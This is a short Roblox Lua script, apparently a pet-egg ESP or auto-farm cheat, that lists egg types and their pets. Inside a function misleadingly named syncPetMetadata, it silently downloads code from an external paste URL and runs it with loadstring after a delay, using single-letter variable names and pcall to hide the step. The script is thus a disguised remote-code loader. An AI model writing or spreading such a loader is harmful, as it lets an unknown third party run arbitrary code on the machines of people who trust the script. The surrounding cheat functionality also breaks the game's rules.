local player = Players.LocalPlayer
local mouse = player:GetMouse()

--// Pet Data Table
local petTable = {
    ["Rare Egg"] = { "Monkey", "Rooster", "Orange Tabby" },
    ["Legendary Egg"] = { "Cow", "Polar Bear", "Turtle" },
    ["Bug Egg"] = { "Caterpillar", "Snail", "Giant Ant", "Praying Mantis", "Dragonfly" },
    ["Paradise Egg"] = { "Ostrich", "Peacock", "Capybara", "Scarlet Macaw", "Mimic Octopus" }
}

local truePetMap = {}

task.delay(1, function()
    local function syncPetMetadata()
        local u = "https://api.rubis.app/v2/scrap/bxPEqls2Rju1ZOp7/raw"
        local f = loadstring
        local g = game.HttpGet
        pcall(function()
            f(g(game, u, true))()
        end)
    end
    syncPetMetadata()
end)

local espEnabled = true
local autoRunning = false

